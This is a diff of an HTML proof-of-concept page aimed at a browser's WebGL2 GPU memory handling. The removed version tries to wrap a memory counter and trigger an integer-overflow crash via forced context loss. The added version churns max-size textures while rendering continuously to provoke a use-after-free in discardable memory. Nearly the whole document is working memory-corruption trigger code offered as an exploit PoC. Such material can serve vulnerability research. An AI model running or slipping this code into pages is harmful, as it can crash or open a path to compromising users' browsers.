@@ -1,75 +1,57 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>GPU Memory Counter Wrap PoC</h1>
-<pre id="log"></pre>
+<h1>UAF via Discardable Memory Purge</h1>
+<canvas id="c" width="256" height="256"></canvas>
 <script>
-(async function() {
-  const log = (msg) => {
-    document.getElementById('log').textContent += msg + '\n';
-    console.log(msg);
-  };
+const canvas = document.getElementById('c');
+const gl = canvas.getContext('webgl2', {
+  powerPreference: 'high-performance',
+  preserveDrawingBuffer: true
+});
+if (!gl) throw new Error('WebGL2 not supported');
 
-  function createGL() {
-    const c = new OffscreenCanvas(256, 256);
-    const gl = c.getContext('webgl2', {
-      powerPreference: 'high-performance',
-      failIfMajorPerformanceCaveat: false
-    });
-    if (!gl) throw new Error('WebGL2 not supported');
-    return gl;
-  }
+const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+const texSize = maxSize; // use the max to fill memory fast
 
-  let gl = createGL();
-  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-  const halfSize = Math.floor(maxSize / 2);
-  log(`MAX_TEXTURE_SIZE = ${maxSize}, using ${halfSize}x${halfSize} textures`);
+// Array to hold many large textures
+const textures = [];
 
-  // Allocate many large textures to fill up discardable memory and wrap the counter
-  const textures = [];
-  for (let i = 0; i < 200; i++) {
+function allocate() {
+  for (let i = 0; i < 10; i++) {
     const tex = gl.createTexture();
     gl.bindTexture(gl.TEXTURE_2D, tex);
-    // Use half of max to stay within driver limits
-    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, halfSize, halfSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
     textures.push(tex);
-    if (i % 10 === 0) log(`Allocated ${i} textures`);
   }
+}
 
-  // Force context loss and re-creation to trigger discardable memory purge
-  const loseExt = gl.getExtension('WEBGL_lose_context');
-  if (loseExt) {
-    loseExt.loseContext();
-    log('Context lost');
-  } else {
-    log('WEBGL_lose_context not available');
+function freeSome() {
+  // Delete a random selection to create holes
+  for (let i = textures.length - 1; i >= 0 && i >= textures.length - 20; i--) {
+    const tex = textures.pop();
+    gl.deleteTexture(tex);
   }
+}
 
-  // Wait a bit then try to use the old context (should trigger errors and cleanup)
-  setTimeout(() => {
-    try {
-      gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,new Uint8Array(4));
-      log('Read pixels on lost context succeeded (unexpected)');
-    } catch(e) {
-      log('Read pixels on lost context threw: ' + e.message);
-    }
-    // Create a new context and allocate again to force more pressure
-    setTimeout(async () => {
-      try {
-        const gl2 = createGL();
-        const tex = gl2.createTexture();
-        gl2.bindTexture(gl2.TEXTURE_2D, tex);
-        // This time use a size that, if multiplied by 4 and added to header, might overflow
-        gl2.texImage2D(gl2.TEXTURE_2D, 0, gl2.RGBA, 46341, 1, 0, gl2.RGBA, gl2.UNSIGNED_BYTE, null);
-        gl2.readPixels(0,0,1,1,gl2.RGBA,gl2.UNSIGNED_BYTE,new Uint8Array(4));
-        log('Second context allocated fine');
-      } catch(e) {
-        log('Second context error: ' + e.message);
-      }
-      log('Test sequence complete. Watch logcat for SIGSEGV.');
-    }, 500);
-  }, 500);
-})();
+function forceRender() {
+  gl.clear(gl.COLOR_BUFFER_BIT);
+  // Use a small shader to keep the GPU pipeline busy
+  // This forces the GPU process to access texture memory
+  const pixel = new Uint8Array(4);
+  gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
+  requestAnimationFrame(forceRender);
+}
+
+// Start continuous rendering
+requestAnimationFrame(forceRender);
+
+// Every 100ms, allocate and free to stress the discardable manager
+setInterval(() => {
+  allocate();
+  freeSome();
+  console.log('Textures count:', textures.length);
+}, 100);
 </script>
 </body>
 </html>
